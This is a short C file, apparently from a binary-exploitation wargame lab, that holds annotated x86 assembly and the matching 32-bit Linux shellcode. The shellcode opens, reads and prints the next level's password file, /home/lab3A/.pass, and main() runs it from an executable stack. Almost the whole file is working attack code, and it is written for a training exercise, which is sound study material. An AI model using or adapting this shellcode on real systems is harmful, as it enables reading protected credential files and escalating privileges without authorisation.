#include <stdio.h>

// gcc -z execstack -o lab3B_sc lab3B_sc.c -m32

/*
xor eax, eax
push eax
xor al, 0x73
push eax
xor al, 0x73
push 0x7361702e
push 0x2f413362
push 0x616c2f65
push 0x6d6f682f
mov ebx, esp	; file path as first argument
xor ecx, ecx	; read only as second argument
xor eax, eax
mov al, 0x5	; prepare to call sys_open
int 0x80

add esp, 0xffffff01	; buffer to read
mov ebx, eax	; new file pointer as first argument
mov ecx, esp	; buffer as second argument
xor edx, edx
mov dl, 0xff	; read length as third argument
xor eax, eax
mov al, 0x3	; prepare to call sys_read
int 0x80

mov bl, 1	; set stdout as first argument
mov ecx, esp	; set buffer as second argument
xor edx, edx
mov dl, 0xff	; write length as third argument
xor eax, eax
mov al, 0x4	; prepare to call sys_write
int 0x80
*/

/*
char shellcode[] = "\x31\xC0\x50\x34\x73\x50\x34\x73\x68\x2E\x70\x61\x73\x68\x62\x33\x41\x2F\x68\x65\x2F\x6C\x61\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xC0\xB0\x05\xCD\x80\x81\xC4\x01\xFF\xFF\xFF\x89\xC3\x89\xE1\x31\xD2\xB2\xFF\x31\xC0\xB0\x03\xCD\x80\xB3\x01\x89\xE1\x31\xD2\xB2\xFF\x31\xC0\xB0\x04\xCD\x80"
*/

char shellcode[] = "\x31\xC0"
                   "\x50"
                   "\x34\x73"
                   "\x50"
                   "\x34\x73"
                   "\x68\x2E\x70\x61\x73"
                   "\x68\x62\x33\x41\x2F"
                   "\x68\x65\x2F\x6C\x61"
                   "\x68\x2F\x68\x6F\x6D"
                   "\x89\xE3"
                   "\x31\xC9"
                   "\x31\xC0"
                   "\xB0\x05"
                   "\xCD\x80"
                   "\x81\xC4\x01\xFF\xFF\xFF"
                   "\x89\xC3"
                   "\x89\xE1"
                   "\x31\xD2"
                   "\xB2\xFF"
                   "\x31\xC0"
                   "\xB0\x03"
                   "\xCD\x80"
                   "\xB3\x01"
                   "\x89\xE1"
                   "\x31\xD2"
                   "\xB2\xFF"
                   "\x31\xC0"
                   "\xB0\x04"
                   "\xCD\x80";

int main() {
/*
	int fd = 0;
	char flag[1024];
	flag[0] = '\0';
	fd = open("/home/lab3A/.pass", 0); //O_RDONLY);
	read(fd, flag, 128);
	write(1, flag, 128);
*/
	(*(void(*)()) shellcode)();
	return 0;
}
